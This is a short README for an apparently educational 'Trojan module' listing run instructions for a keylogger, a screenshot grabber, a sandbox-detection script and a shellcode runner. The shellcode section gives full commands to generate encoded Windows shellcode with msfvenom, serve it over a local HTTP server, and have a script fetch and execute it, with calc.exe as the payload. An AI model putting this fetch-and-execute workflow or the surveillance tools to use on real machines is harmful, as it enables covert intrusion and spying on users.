# The Trojan module
## keylogger.py
This should only work on Windows, but I didn't test it on other operating systems.
Run:
```bash
python keylogger.py
```
## screenshotter.py
Run:
```bash
python screenshotter.py
```
Check for a screenshot.bmp file in the current directory.
## shell-exec.py
First, generate the shellcode using msfvenom:
```bash
msfvenom -p windows/exec -e x86/shikata_ga_nai -i 1 -f raw cmd=calc.exe > shellcode.raw
```
Then, convert it into a bin file:
```bash
base64 -w 0 -i shellcode.raw > shellcode.bin
```
At last, on the current directory, run:
```bash
python -m http.server 8100
```
to start a mini-server in no time.

Now, run:
```bash
python shell_exec.py
```
to run the shellcode you just generated!
## sandbox-detect.py
```bash
python sandbox-detect.py
```
